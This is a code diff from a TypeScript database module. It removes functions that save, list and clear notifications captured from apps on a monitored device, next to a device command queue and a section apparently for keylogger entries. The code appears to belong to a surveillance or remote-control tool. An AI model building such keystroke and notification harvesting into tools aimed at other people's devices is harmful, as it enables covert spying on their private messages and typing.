@@ -249,51 +249,6 @@ export async function getPendingCommands(deviceId: string): Promise<PendingComma
   return rows.map(r => ({ id: r.id, command: r.command, createdAt: r.created_at }))
 }
 
-// ─── Notifications ────────────────────────────────────────────────────────────
-
-export interface AppNotification {
-  id: number
-  appPackage: string
-  appName: string
-  title: string
-  text: string
-  receivedAt: string
-}
-
-export async function saveNotification(deviceId: string, n: Omit<AppNotification, 'id' | 'receivedAt'>) {
-  await pool.query(
-    `INSERT INTO notifications (device_id, app_package, app_name, title, text)
-     VALUES ($1, $2, $3, $4, $5)`,
-    [deviceId, n.appPackage, n.appName, n.title, n.text]
-  )
-  // Keep last 500 per device
-  await pool.query(
-    `DELETE FROM notifications WHERE device_id = $1 AND id NOT IN (
-       SELECT id FROM notifications WHERE device_id = $1 ORDER BY received_at DESC LIMIT 500
-     )`,
-    [deviceId]
-  )
-}
-
-export async function getNotifications(deviceId: string, limit = 100): Promise<AppNotification[]> {
-  const { rows } = await pool.query(
-    `SELECT * FROM notifications WHERE device_id = $1 ORDER BY received_at DESC LIMIT $2`,
-    [deviceId, limit]
-  )
-  return rows.map(r => ({
-    id: r.id,
-    appPackage: r.app_package,
-    appName: r.app_name,
-    title: r.title,
-    text: r.text,
-    receivedAt: r.received_at,
-  }))
-}
-
-export async function clearNotifications(deviceId: string) {
-  await pool.query(`DELETE FROM notifications WHERE device_id = $1`, [deviceId])
-}
-
 // ─── Keylogger ────────────────────────────────────────────────────────────────
 
 export interface KeylogEntry {
